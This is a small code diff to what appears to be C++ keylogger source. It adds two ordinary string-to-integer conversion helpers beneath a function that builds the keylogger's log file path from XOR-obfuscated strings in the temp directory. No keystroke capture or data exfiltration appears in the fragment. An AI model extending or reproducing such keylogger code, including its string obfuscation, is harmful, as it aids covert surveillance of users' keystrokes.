@@ -103,3 +103,21 @@ std::string getKeyLoggerLogPath()
     char LogPath[] = "\x5c\x74\x72\x67\x65\x71\x63\x2a\x60\x70\x62\x78\x68\x6b\x37\x37\x3e\x7d\x7d\x74";
     return getenv(unxor(TMP)) + (std::string)unxor(LogPath);
 }
+
+int String_2_Int(std::string str)
+{
+    std::stringstream ss;
+    ss << str;
+    int res;
+    ss >> res;
+    return res;
+
+}
+std::string Int_2_String(int num)
+{
+    std::stringstream ss;
+    ss << num;
+    std::string res;
+    ss >> res;
+    return res;
+}
